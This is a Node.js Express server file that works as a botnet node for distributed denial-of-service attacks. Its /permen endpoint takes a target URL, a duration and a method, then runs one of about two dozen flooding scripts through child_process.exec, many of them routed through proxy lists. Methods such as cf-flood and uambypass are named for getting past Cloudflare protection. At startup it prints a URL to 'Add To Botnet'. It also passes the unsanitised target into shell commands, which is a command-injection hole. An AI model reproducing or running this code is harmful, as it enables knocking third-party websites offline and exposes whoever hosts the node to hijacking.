const express = require('express');
const { exec } = require('child_process');
const fetch = require('node-fetch'); // Ensure you have installed node-fetch
const path = require('path');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
const scrapeProxies = require('./proxy.js');

async function fetchData() {
  try {
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
    return data;
  } catch (error) {
    console.error('Error fetching data:', error);
  }
}

app.get('/permen', (req, res) => {
  const { target, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

  // Eksekusi sesuai methods
  const scriptPath = path.join(__dirname, 'methods');
  const commands = {
    ninja: `node ${path.join(scriptPath, 'StarsXNinja.js')} ${target} ${time}`,
    mix: `node ${path.join(scriptPath, 'StarsXMix.js')} ${target} ${time} 100 10 proxy.txt`,
    strike: `node ${path.join(scriptPath, 'strike.js')} GET ${target} ${time} 10 90 proxy.txt --full --legit`,
    glory: `node ${path.join(scriptPath, 'glory.js')} ${target} ${time} 9 10 proxy.txt`,
    bipas: `node ${path.join(scriptPath, 'bipas.js')} ${target} ${time} 50 9 proxy.txt`,
    https: `node ${path.join(scriptPath, 'https.js')} ${target} ${time} 9 9 proxy.txt`,
    raw: `node ${path.join(scriptPath, 'raw.js')} ${target} ${time}`,
    h2: `node ${path.join(scriptPath, 'h2.js')} ${target} ${time} 9 10 proxy.txt`,
    pidoras: `node ${path.join(scriptPath, 'pidoras.js')} ${target} ${time} 100 10 proxy.txt`,
    xyn: `node ${path.join(scriptPath, 'xyn.js')} ${target} ${time} 20 9 proxy.txt`,
    'c-f': `node ${path.join(scriptPath, 'c-f.js')} ${target} ${time} 8 3`,
    storm: `node ${path.join(scriptPath, 'storm.js')} ${target} ${time} 100 10 proxy.txt`,
    lumpuh: `node ${path.join(scriptPath, 'lumpuh.js')} ${target} ${time} 8 9 proxy.txt`,
    thunder: `node ${path.join(scriptPath, 'thunder.js')} ${target} ${time} 100 10 proxy.txt`,
    bypass: `node ${path.join(scriptPath, 'bypass.js')} ${target} ${time} 32 10 proxy.txt`,
    'cf-flood': `node ${path.join(scriptPath, 'cf-flood.js')} ${target} ${time}`,
    'http-vip': `node ${path.join(scriptPath, 'HTTP-VIP.js')} ${target} ${time} 100 10 proxy.txt`,
    uam: `node ${path.join(scriptPath, 'uambypass.js')} ${target} ${time} 100 proxy.txt`,
    rape: `node ${path.join(scriptPath, 'rape.js')} GET ${time} 10 proxy.txt 100 ${target}`,
    tornado: `node ${path.join(scriptPath, 'TORNADOV2.js')} GET ${target} ${time} 10 100 proxy.txt`,
    'raw-mix': `node ${path.join(scriptPath, 'RAW-MIX.js')} ${target} ${time}`,
    drown: `node ${path.join(scriptPath, 'drown.js')} ${target} ${time} 10 100`,
    browser: `node ${path.join(scriptPath, 'browser.js')} ${target} ${time} 10 100`,
    'tls-hum': `node ${path.join(scriptPath, 'tls-hum.js')} ${target} ${time} 100 10 proxy.txt`,
  };

  if (commands[methods]) {
    exec(commands[methods], (error, stdout, stderr) => {
      if (error) {
        console.error(`Error executing script: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`Script stderr: ${stderr}`);
        return;
      }
      console.log(`Script output: ${stdout}`);
    });
  } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
  fetchData();
  console.log(`Server is running on port ${port}`);
});
